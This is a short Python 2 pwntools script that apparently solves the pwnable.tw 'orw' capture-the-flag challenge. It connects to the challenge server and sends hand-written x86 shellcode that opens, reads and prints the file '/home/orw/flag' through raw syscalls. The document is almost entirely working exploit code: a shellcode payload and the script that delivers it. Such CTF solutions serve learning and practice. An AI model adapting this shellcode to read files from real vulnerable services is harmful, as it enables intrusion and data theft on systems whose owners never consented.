from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = 'orw'
e = ELF(file)
libc = e.libc
ip = 'chall.pwnable.tw'
port = '10001'
p = process(file)
p = remote(ip, port)
shellcode = '''
    push 0x6761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
	mov ebx,esp
	mov eax,0x5
	mov ecx,0
	mov edx,0
	int 0x80
	mov eax,3
	mov ebx,3
	mov ecx,esp
	mov edx,100
	int 0x80
	mov eax,4
	mov ebx,1
	mov ecx,esp
	mov edx,100
	int 0x80
'''
# print asm(shellcode)

p.recv()
# gdb.attach(p, "b*0x0804858A")
p.sendline(asm(shellcode))
print p.recv()